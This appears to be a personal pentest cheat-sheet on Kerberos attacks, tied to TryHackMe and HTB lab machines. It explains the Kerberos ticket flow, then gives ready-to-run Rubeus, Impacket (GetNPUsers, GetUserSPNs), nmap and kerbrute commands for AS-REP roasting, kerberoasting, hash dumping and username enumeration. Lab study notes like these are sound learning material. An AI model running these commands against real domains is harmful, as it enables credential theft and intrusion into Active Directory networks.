KERBEROS

https://tryhackme.com/room/attackingkerberos

Be sure to check if the target machine is vulnerable to [MS14-068](evernote:///view/154730691/s619/ebed9d85-7f8a-44d0-f0cc-bbd40894a4c9/1d460891-63f3-60f9-1414-81daf5a18a5c/)

|     |     |     |     |
| --- | --- | --- | --- |
| **KDC     >** | **AS     >** | **TGTs     >** | **TGS** |
| The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service. | The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets. | A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain. | The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain. |

- **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- **KDC Long Term Secret Key (KDC LT Key) **- The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- **Client Long Term Secret Key (Client LT Key) **- The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- **Service Long Term Secret Key (Service LT Key) **- The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

Kerberos Authentication Overview -

![](https://i.imgur.com/VRr2B6w.png)

AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6.) The service grants access

* * *

## **RUBEUS**

**This command tells Rubeus to harvest for TGTs every 30 seconds**

Rubeus.exe harvest /interval:30

**This will dump the Kerberos hash of any kerberoastable users **

Rubeus.exe kerberoast

**Equivalent to getnpusers from impacket**

**Insert 23$ after $krb5asrep$** so that the first line will be $krb5asrep$23$User..... (Before cracking with hashcat)

Rubeus.exe asreproast

* * *

## **IMPACKET - GetNPUsers.py (require port 88 and 389)**

Get password's hash for users who do not require kerberos auth.

GetNPUsers.py -dc-ip 10.10.10.234 -request 'htb.local/'
GetNPUsers.py -dc-ip 10.10.10.234 'htb.local/' -usersfile ~/cascade/users.lst

python ./Downloads/impacket-0.9.21/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile ~/sauna/users.lst -format hashcat -outputfile ~/sauna/npusers.hashes

Some accounts like svc-admin doesn't requir any passwords so we can try adding the argument -no-pass to the command like so

GetNPUsers.py 'spookysec.local/' -dc-ip 10.10.71.129 -usersfile ./users-to-crack -format hashcat -no-pass

**Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....**

* * *

## **IMPACKET - GetUserSPNs.py**

**
**

sudo python3 GetUserSPNs.py controller.local/<User>:<Password> -dc-ip 10.10.234.1 -request

This will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

* * *

## **NMAP**

Get valid username

sudo nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL',userdb=/home/greg/sauna/users.lst 10.10.10.175

* * *

## **KERBRUTE**

**
**
Get valid users from kerberos (better than nmap)

~/toolbox/kerbrute/dist/kerbrute_linux_amd64 userenum -d htb.local -t 20 --dc 10.10.10.52 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

**
**
**
**
**
**